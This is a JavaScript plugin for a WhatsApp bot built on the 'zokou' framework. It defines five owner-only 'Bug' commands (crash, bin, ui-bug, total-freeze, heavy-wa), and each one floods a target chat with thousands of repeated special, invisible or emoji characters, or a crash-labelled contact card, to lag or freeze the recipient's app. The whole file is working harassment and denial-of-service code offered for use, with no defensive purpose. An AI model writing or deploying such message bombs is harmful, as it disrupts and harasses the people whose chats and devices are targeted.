"use strict";

const { zokou } = require("../framework/zokou");

// Specialized characters for bugging (Virus strings)
const bugChar = "⹘".repeat(10000);
const invisibleChar = "‎".repeat(15000);

// 1. CRASH COMMAND (Lags the chat interface)
zokou({
    nomCom: "crash",
    categorie: "Bug",
    reaction: "🔥"
}, async (dest, zk, commandeOptions) => {
    const { repondre, superUser } = commandeOptions;

    if (!superUser) return repondre("❌ This command is for the Owner only.");
    
    await zk.sendMessage(dest, { 
        text: `𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝚃𝙼𝙳 𝙲𝚁𝙰𝚂𝙷 𝚂𝚈𝚂𝚃𝙴𝙼\n${bugChar}` 
    });
});

// 2. BIN COMMAND (Binary Attack - Makes the chat extremely heavy)
zokou({
    nomCom: "bin",
    categorie: "Bug",
    reaction: "👾"
}, async (dest, zk, commandeOptions) => {
    const { repondre, superUser } = commandeOptions;

    if (!superUser) return repondre("❌ This command is for the Owner only.");

    let binaryData = "";
    for (let i = 0; i < 5000; i++) {
        binaryData += "01010110 01101001 01110010 01110101 01110011 ";
    }

    await zk.sendMessage(dest, { text: binaryData });
});

// 3. UI-BUG COMMAND (Distorts the Chat Interface)
zokou({
    nomCom: "ui-bug",
    categorie: "Bug",
    reaction: "⚠️"
}, async (dest, zk, commandeOptions) => {
    const { repondre, superUser } = commandeOptions;

    if (!superUser) return repondre("❌ This command is for the Owner only.");

    await zk.sendMessage(dest, { 
        text: `⚠️ 𝚂𝚈𝚂𝚃𝙴𝙼 𝙴𝚁𝚁𝙾𝚁 ⚠️\n${invisibleChar} 𝚄𝙸 𝙵𝚁𝙴𝙴𝚉𝙴` 
    });
});

// 4. TOTAL-FREEZE COMMAND (Corrupted Contact Card Attack)
zokou({
    nomCom: "total-freeze",
    categorie: "Bug",
    reaction: "🥶"
}, async (dest, zk, commandeOptions) => {
    const { repondre, superUser } = commandeOptions;

    if (!superUser) return repondre("❌ This command is for the Owner only.");

    const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                  'FN:𝚃𝙸𝙼𝙽𝙰𝚂𝙰 𝚃𝙼𝙳 𝙳𝙴𝙰𝚃𝙷\n' + 
                  'ORG:Crash System;\n' + 
                  'TEL;type=CELL;type=VOICE;waid=255743706043:+255 743 706 043\n' + 
                  'END:VCARD';

    await zk.sendMessage(dest, { 
        contacts: { 
            displayName: '𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝚃𝙼𝙳 𝙵𝚁𝙴𝙴𝚉𝙴', 
            contacts: [{ vcard }] 
        } 
    });
});

// 5. HEAVY-WA COMMAND (Emoji Overload - RAM Stress Test)
zokou({
    nomCom: "heavy-wa",
    categorie: "Bug",
    reaction: "💣"
}, async (dest, zk, commandeOptions) => {
    const { repondre, superUser } = commandeOptions;

    if (!superUser) return repondre("❌ This command is for the Owner only.");

    const heavyEmoji = "🔥".repeat(20000);
    await zk.sendMessage(dest, { 
        text: `𝙱𝙾𝙼𝙱 𝙰𝚃𝚃𝙰𝙲𝙺:\n${heavyEmoji}` 
    });
});
